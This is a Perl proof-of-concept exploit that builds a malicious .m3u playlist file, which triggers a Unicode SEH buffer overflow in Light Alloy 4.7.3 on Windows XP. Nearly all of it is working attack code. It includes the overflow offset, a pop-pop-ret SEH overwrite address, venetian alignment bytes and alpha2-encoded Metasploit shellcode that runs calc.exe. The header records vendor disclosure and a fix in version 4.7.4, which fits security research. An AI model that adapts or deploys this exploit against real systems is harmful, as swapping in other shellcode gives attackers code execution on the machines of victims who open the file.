#!/usr/bin/perl

############################################################################################
# Exploit Title: Light Alloy 4.7.3 (.m3u) - SEH Buffer Overflow (Unicode)
# Date: 11-18-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: Light Alloy v4.7.3 
# Vendor Site: http://www.light-alloy.ru/
# Vulnerable Software Link: http://www.softpedia.com/dyn-postdownload.php?p=182552&t=4&i=1
# Version: 4.7.3
# Tested On: Windows XP SP3
# Timeline:
# -- 18 Nov 2013: Vulnerability discovered, contacted vendor
# -- 19 Nov 2013: Additional details provided, developer fix, pre-released tested/confirmed
# -- 20 Nov 2013: Version 4.7.4 released with vuln fix
############################################################################################

my $buffsize = 5000; # sets buffer size for consistent sized payload
my $junk = "http://" . "\x41" x 4090; # offset to seh
my $nseh = "\x61\x62"; # overwrite next seh with popad (populates all registers) + nop
my $seh = "\x33\x43"; # overwrite seh with unicode friendly pop pop ret
		      # 0x00430033 : pop esi # pop ebx # ret  (C:\Program Files\Light Alloy\LA.exe)
		      
# unicode venetian alignment
my $venalign = "\x53"; # push ebx; ebx is the register closest to our shellcode following the popad 
$venalign = $venalign . "\x71"; # venetian pad/align
$venalign = $venalign . "\x58"; # pop eax; put ebx into eax and modify to jump to our shellcode (100 bytes)
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x05\x14\x11"; # add eax,0x11001400
$venalign = $venalign . "\x6e"; # venetian pad/align 
$venalign = $venalign . "\x2d\x13\x11"; # sub eax,0x11001300
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x50"; # push eax
$venalign = $venalign . "\x6d"; # venetian pad/align
$venalign = $venalign . "\xc3"; # ret

my $nops = "\x71" x 109; # some unicode friendly filler before the shellcode

# Calc.exe payload
# msfpayload windows/exec CMD=calc.exe R
# alpha2 unicode/uppercase
my $shell = "PPYAIAIAIAIAQATAXAZAPA3QADAZA".
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA".
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB".
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K".
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL".
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55".
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V".
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB".
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT".
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU".
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM".
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC".
"QQ2LRCM0LJA";
 
my $sploit = $junk.$nseh.$seh.$venalign.$nops.$shell; # assemble the exploit portion of the buffer
my $fill = "\x71" x ($buffsize - length($sploit)); # fill remainder of buffer with junk
my $buffer = $sploit.$fill; # assemble the final buffer

# write the exploit buffer to file
my $file = "lightalloy_unicodeseh.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n"; 